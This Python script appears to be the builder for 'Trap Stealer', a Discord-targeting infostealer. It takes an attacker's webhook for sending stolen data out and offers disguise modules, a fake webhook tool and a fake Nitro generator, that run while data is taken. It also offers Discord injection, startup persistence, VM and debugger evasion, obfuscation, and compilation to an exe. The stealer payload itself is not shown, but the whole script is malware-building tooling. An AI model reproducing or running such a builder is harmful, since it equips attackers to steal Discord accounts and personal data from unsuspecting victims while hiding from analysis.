import os, platform, subprocess, shutil
while True:
    os.makedirs('./Build', exist_ok=True)
    shutil.copy('main.py', './Build/Trap-Stl-Building.py')
    def clear_console():
        operating_system = platform.system()
        if operating_system == 'Windows':
            os.system('cls')
        else:
            os.system('clear')  

    def get_boolean_input(prompt):
        while True:
            user_input = input(prompt).lower()
            if user_input in ['y', 'yes']:
                return True
            elif user_input in ['n', 'no']:
                return False
            else:
                print('Invalid input. Please enter Y or N.')


    with open('main.py', 'r', encoding='utf-8', errors='replace') as file:
        content = file.read()
    Webhook = input('Enter the webhook -> ')
    FakeWeb = get_boolean_input('Do you want to enable Fake Webhook Module (When the file is launched it will show a Webhook Tools while getting data) Y/N: ')
    FakeGen = get_boolean_input('Do you want to enable Fake Generator Module (When the file is launched it will show a nitro generator while getting data) Y/N: ')
    Injection = get_boolean_input('Do you want to inject the script to discord Startup Y/N: ')
    Startup = get_boolean_input('Do you want to add the file to the startup folder? Y/N: ')
    No_Debug = get_boolean_input('Do you want to enable VM Checker and Anti Debugging Y/N: ')
    Close = get_boolean_input('Do you want to prevent Discord from being launched again? Y/N: ')


    new_content = content.replace("%Webhook%", Webhook)
    new_content = new_content.replace("'%FakeWebhook%'", str(FakeWeb))
    new_content = new_content.replace("'%FakeGen%'", str(FakeGen))
    new_content = new_content.replace("'%Injection%'", str(Injection))
    new_content = new_content.replace("'%Startup%'", str(Startup))
    new_content = new_content.replace("'%No_Debug%'", str(No_Debug))
    new_content = new_content.replace("'%Close%'", str(Close))
    with open(f'./Build/temp.py', 'w', encoding='utf-8') as file:
        file.write(new_content)
    clear_console()
    print('Created [+]')
    

    Obfuscation = input('Do you want to obfuscate it? Y/N: ')
    Obfuscation = Obfuscation.lower()
    Exe = input('Do you want to make Trap Stealer with the exe format? (Take 5 minutes) Y/N: ')
    Exe = Exe.lower()
    name = input('Enter how you want the file to be named (Do not put the extension): ')
    while True:
        if Obfuscation in ['y', 'yes']:
            try:
                with open(f'./Build/{name}.py', 'w', encoding='utf-8') as file:
                    file.write(new_content)
                subprocess.run(['python', 'obfuscator.py', f'{name}'], check=False)
                break  
            except subprocess.CalledProcessError:
                print('Obfuscation process encountered an error.')
                break  
        elif Obfuscation in ['n', 'no']:
            with open(f'./Build/{name}.py', 'w', encoding='utf-8') as file:
                file.write(new_content)
                print(f'[+] File Created {name}.py')
                input('Press any key to quit...')
                break 
        else:
            Obfuscation = input('Invalid input. Please enter Y or N: ')
            Obfuscation = Obfuscation.lower()

    while True:

        
        if Exe in ['y', 'yes']:
            command = [
                'nuitka',
                '--onefile',
                '--include-module=ctypes,sqlite3,Crypto,requests,optparse',
                f'--output-dir=./Build',
                f'./Build/{name}.py'
            ]
            try:
                import nuitka
            except ImportError:
                subprocess.call(['pip', 'install', 'Nuitka'])
            subprocess.run(command, check=True, shell=True)
            input(f'File {name}.exe successfully created press any key to quit')
            quit()
        elif Exe in ['n', 'no']:
            input('You chose not to create an exe. Press any key to quit')
            quit()
        else:
            print('Invalid input for creating an exe. Please enter Y or N.')
            quit()
